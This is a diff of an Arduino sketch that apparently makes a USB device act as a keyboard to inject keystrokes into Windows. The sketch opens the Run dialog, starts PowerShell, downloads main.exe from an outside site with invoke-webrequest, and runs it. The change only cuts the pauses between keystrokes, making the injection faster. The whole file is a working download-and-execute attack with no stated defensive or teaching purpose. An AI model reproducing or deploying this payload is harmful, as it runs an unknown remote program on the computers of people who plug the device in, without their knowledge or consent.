@@ -5,15 +5,15 @@ void setup() {
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
-  delay(300);
+  delay(200);
   Keyboard.println("powershell");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(300);
+  delay(200);
   Keyboard.println("invoke-webrequest -uri https://www.lzc.app/main.exe -outfile main.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(300);
+  delay(200);
   Keyboard.println(".\\main.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
